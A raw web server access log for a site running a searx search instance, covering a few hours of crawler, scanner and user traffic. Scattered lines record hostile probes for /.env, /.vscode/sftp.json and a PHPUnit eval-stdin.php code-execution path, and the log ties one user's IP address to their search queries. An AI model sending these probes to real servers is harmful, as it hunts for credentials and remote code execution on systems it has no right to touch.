46.193.1.170 - - [23/Mar/2023:13:10:53 +0000] "GET /searx/static/themes/oscar/js/jquery.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:13:10:53 +0000] "GET /searx/static/themes/oscar/js/bootstrap.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:13:10:53 +0000] "GET /searx/static/themes/oscar/js/typeahead.bundle.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:13:10:53 +0000] "GET /searx/static/themes/oscar/js/searx.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:13:10:53 +0000] "GET /searx/static/plugins/js/search_on_category_select.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:13:10:54 +0000] "GET /searx/static/themes/oscar/fonts/glyphicons-halflings-regular.woff2 HTTP/1.1" 200 18028 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:13:10:54 +0000] "GET /searx/static/themes/oscar/img/favicon.png HTTP/1.1" 499 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
128.1.248.26 - - [23/Mar/2023:13:15:14 +0000] "GET / HTTP/1.1" 200 415708 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
51.222.253.4 - - [23/Mar/2023:13:21:19 +0000] "GET /robots.txt HTTP/1.1" 404 125 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
54.36.148.241 - - [23/Mar/2023:13:21:22 +0000] "GET /posts/ho-iniziato-a-imparare-litaliano/ho-iniziato-a-imparare-litaliano.html HTTP/1.1" 200 1897 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
143.110.222.166 - - [23/Mar/2023:13:28:42 +0000] "GET / HTTP/1.1" 200 415740 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
45.32.206.215 - - [23/Mar/2023:13:53:58 +0000] "GET /.env HTTP/1.1" 404 0 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.32.206.215 - - [23/Mar/2023:13:53:58 +0000] "POST / HTTP/1.1" 405 0 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
167.248.133.185 - - [23/Mar/2023:13:54:19 +0000] "GET / HTTP/1.1" 200 5190 "-" "-"
167.248.133.185 - - [23/Mar/2023:13:54:19 +0000] "GET / HTTP/1.1" 200 1583 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.248.133.185 - - [23/Mar/2023:13:54:20 +0000] "PRI * HTTP/2.0" 400 157 "-" "-"
167.248.133.185 - - [23/Mar/2023:13:54:20 +0000] "GET /favicon.ico HTTP/1.1" 200 15406 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:14:02:57 +0000] "POST /searx/search HTTP/1.1" 200 12400 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:14:02:57 +0000] "GET /searx/static/themes/oscar/css/bootstrap.min.css HTTP/1.1" 200 125509 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:14:02:57 +0000] "GET /searx/static/themes/oscar/css/logicodev-dark.min.css HTTP/1.1" 200 17731 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:14:02:57 +0000] "GET /searx/static/plugins/js/search_on_category_select.js HTTP/1.1" 200 1457 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:14:02:57 +0000] "GET /searx/static/themes/oscar/js/typeahead.bundle.min.js HTTP/1.1" 200 45062 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:14:02:57 +0000] "GET /searx/static/themes/oscar/js/jquery.min.js HTTP/1.1" 200 89501 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:14:02:57 +0000] "GET /searx/static/themes/oscar/js/bootstrap.min.js HTTP/1.1" 200 39680 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:14:02:57 +0000] "GET /searx/static/themes/oscar/js/searx.min.js HTTP/1.1" 200 6370 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:14:02:57 +0000] "GET /searx/static/themes/oscar/fonts/glyphicons-halflings-regular.woff2 HTTP/1.1" 200 18028 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:14:03:08 +0000] "GET /searx/search?q=quartier%20jeunes%20paris HTTP/1.1" 200 6761 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:14:03:08 +0000] "GET /searx/static/themes/oscar/css/bootstrap.min.css HTTP/1.1" 304 0 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:14:03:08 +0000] "GET /searx/static/plugins/js/search_on_category_select.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:14:03:08 +0000] "GET /searx/static/themes/oscar/js/searx.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:14:03:08 +0000] "GET /searx/static/themes/oscar/js/bootstrap.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:14:03:08 +0000] "GET /searx/static/themes/oscar/js/typeahead.bundle.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:14:03:08 +0000] "GET /searx/static/themes/oscar/css/logicodev-dark.min.css HTTP/1.1" 304 0 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:14:03:08 +0000] "GET /searx/static/themes/oscar/js/jquery.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:14:03:08 +0000] "GET /searx/static/themes/oscar/fonts/glyphicons-halflings-regular.woff2 HTTP/1.1" 304 0 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:14:03:09 +0000] "GET /searx/autocompleter?q=quartier%20jeunes%20paris HTTP/1.1" 200 299 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:14:03:11 +0000] "POST /searx/search HTTP/1.1" 200 6445 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:14:03:11 +0000] "GET /searx/static/themes/oscar/css/bootstrap.min.css HTTP/1.1" 304 0 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:14:03:11 +0000] "GET /searx/static/plugins/js/search_on_category_select.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:14:03:11 +0000] "GET /searx/static/themes/oscar/css/logicodev-dark.min.css HTTP/1.1" 304 0 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:14:03:11 +0000] "GET /searx/static/themes/oscar/js/jquery.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:14:03:11 +0000] "GET /searx/static/themes/oscar/js/typeahead.bundle.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:14:03:11 +0000] "GET /searx/static/themes/oscar/js/searx.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:14:03:11 +0000] "GET /searx/static/themes/oscar/js/bootstrap.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:14:03:11 +0000] "GET /searx/static/themes/oscar/fonts/glyphicons-halflings-regular.woff2 HTTP/1.1" 304 0 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
94.102.61.10 - - [23/Mar/2023:14:05:50 +0000] "GET / HTTP/1.1" 200 415971 "-" "python-requests/2.26.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:14:05:50 +0000] "POST /searx/search HTTP/1.1" 200 9320 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:14:05:51 +0000] "GET /searx/static/themes/oscar/css/bootstrap.min.css HTTP/1.1" 304 0 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:14:05:51 +0000] "GET /searx/static/plugins/js/search_on_category_select.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:14:05:51 +0000] "GET /searx/static/themes/oscar/js/searx.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:14:05:51 +0000] "GET /searx/static/themes/oscar/js/jquery.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:14:05:51 +0000] "GET /searx/static/themes/oscar/css/logicodev-dark.min.css HTTP/1.1" 304 0 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:14:05:51 +0000] "GET /searx/static/themes/oscar/js/typeahead.bundle.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:14:05:51 +0000] "GET /searx/static/themes/oscar/js/bootstrap.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:14:05:51 +0000] "GET /searx/static/themes/oscar/fonts/glyphicons-halflings-regular.woff2 HTTP/1.1" 304 0 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:14:05:51 +0000] "GET /searx/autocompleter?q=quartier%20jeunes%20paris HTTP/1.1" 200 299 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
94.102.61.10 - - [23/Mar/2023:14:10:42 +0000] "GET / HTTP/1.1" 200 415939 "-" "python-requests/2.26.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:14:11:01 +0000] "GET /searx/search?q=NIDS HTTP/1.1" 200 8917 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:14:11:01 +0000] "GET /searx/static/themes/oscar/css/bootstrap.min.css HTTP/1.1" 200 125509 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:14:11:02 +0000] "GET /searx/static/themes/oscar/js/typeahead.bundle.min.js HTTP/1.1" 200 45062 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:14:11:02 +0000] "GET /searx/static/themes/oscar/css/logicodev-dark.min.css HTTP/1.1" 200 17731 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:14:11:02 +0000] "GET /searx/static/plugins/js/search_on_category_select.js HTTP/1.1" 200 1457 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:14:11:02 +0000] "GET /searx/static/themes/oscar/js/bootstrap.min.js HTTP/1.1" 200 39680 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:14:11:02 +0000] "GET /searx/static/themes/oscar/js/searx.min.js HTTP/1.1" 200 6370 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:14:11:02 +0000] "GET /searx/static/themes/oscar/js/jquery.min.js HTTP/1.1" 200 89501 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:14:11:02 +0000] "GET /searx/static/themes/oscar/fonts/glyphicons-halflings-regular.woff2 HTTP/1.1" 200 18028 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
143.110.222.166 - - [23/Mar/2023:14:27:46 +0000] "GET / HTTP/1.1" 200 415740 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
54.39.49.180 - - [23/Mar/2023:14:31:16 +0000] "GET /.env HTTP/1.1" 404 153 "-" "Mozilla/5.0 (X11; Linux x86_64)"
167.94.138.35 - - [23/Mar/2023:14:32:17 +0000] "GET / HTTP/1.1" 200 5190 "-" "-"
167.94.138.35 - - [23/Mar/2023:14:32:18 +0000] "GET / HTTP/1.1" 200 1583 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.138.35 - - [23/Mar/2023:14:32:18 +0000] "PRI * HTTP/2.0" 400 157 "-" "-"
167.94.138.35 - - [23/Mar/2023:14:32:18 +0000] "GET /favicon.ico HTTP/1.1" 200 15406 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
45.32.206.215 - - [23/Mar/2023:14:32:33 +0000] "GET /.env HTTP/1.1" 404 0 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.32.206.215 - - [23/Mar/2023:14:32:33 +0000] "POST / HTTP/1.1" 405 0 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
23.251.102.74 - - [23/Mar/2023:14:34:23 +0000] "GET / HTTP/1.1" 200 1583 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
179.43.177.242 - - [23/Mar/2023:14:49:28 +0000] "GET / HTTP/1.1" 200 2826140 "-" "Hello World"
152.89.196.54 - - [23/Mar/2023:14:54:17 +0000] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.104.11.34 - - [23/Mar/2023:14:58:26 +0000] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03,\xFA\xBC\xE0BN\xD5\x8ENK9\x9B\xE3\x8EZ\x882}\xB9\xB5\x85{W\xFF\x19s\x93\xB4\x16*\x0Ba\x00\x00 \xC0/\xC00\xC0+\xC0,\xCC\xA8\xCC\xA9\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
62.233.50.15 - - [23/Mar/2023:15:00:43 +0000] "\x16\x03\x03\x00\x94\x01\x00\x00\x90\x03\x03d\x1Ci\x9AA\x82\xFC\xFEfq\x0C\xD0)\x1D\x02\x07\xD0\xDC\x0B\xAF\x22\xAB\xFC\x1F\xB5;%\x16\xC5O\xC0\x96\x00\x00*\xC0,\xC0+\xC00\xC0/\x00\x9F\x00\x9E\xC0$\xC0#\xC0(\xC0'\xC0" 400 157 "-" "-"
42.83.147.53 - - [23/Mar/2023:15:07:23 +0000] "GET / HTTP/1.1" 200 415708 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)Chrome/74.0.3729.169 Safari/537.36"
40.77.167.184 - - [23/Mar/2023:15:09:42 +0000] "GET /robots.txt HTTP/1.1" 404 188 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
40.77.167.191 - - [23/Mar/2023:15:09:52 +0000] "GET / HTTP/1.1" 200 1583 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
40.77.167.239 - - [23/Mar/2023:15:15:04 +0000] "GET / HTTP/1.1" 200 1010 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
2620:96:e000:b0cc:e:2:2:6 - - [23/Mar/2023:15:19:53 +0000] "GET / HTTP/1.1" 200 5190 "-" "-"
2620:96:e000:b0cc:e:2:2:6 - - [23/Mar/2023:15:19:53 +0000] "GET / HTTP/1.1" 200 1583 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
2620:96:e000:b0cc:e:2:2:6 - - [23/Mar/2023:15:19:53 +0000] "PRI * HTTP/2.0" 400 157 "-" "-"
2620:96:e000:b0cc:e:2:2:6 - - [23/Mar/2023:15:19:54 +0000] "GET /favicon.ico HTTP/1.1" 200 15406 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
85.208.107.53 - - [23/Mar/2023:15:24:03 +0000] "GET /.vscode/sftp.json HTTP/1.1" 301 169 "-" "-"
85.208.107.53 - - [23/Mar/2023:15:24:03 +0000] "GET /.vscode/sftp.json HTTP/1.1" 404 125 "http://pseudot.org/.vscode/sftp.json" "-"
40.77.167.220 - - [23/Mar/2023:15:26:20 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
143.110.222.166 - - [23/Mar/2023:15:28:36 +0000] "GET / HTTP/1.1" 200 415740 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
152.89.196.54 - - [23/Mar/2023:15:30:54 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
40.77.167.191 - - [23/Mar/2023:15:39:24 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:15:40:08 +0000] "GET /searx/search?q=cfdt%20france HTTP/1.1" 200 8594 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:15:40:08 +0000] "GET /searx/static/themes/oscar/css/bootstrap.min.css HTTP/1.1" 200 125509 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:15:40:08 +0000] "GET /searx/static/themes/oscar/css/logicodev-dark.min.css HTTP/1.1" 200 17731 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:15:40:08 +0000] "GET /searx/static/plugins/js/search_on_category_select.js HTTP/1.1" 200 1457 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
2a01:cb01:2053:a67f:ad89:ca6d:c433:5873 - - [23/Mar/2023:15:40:08 +0000] "GET /searx/static/themes/oscar/js/searx.min.js HTTP/1.1" 200 6370 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110 Mobile/15E148 Version/15.0"
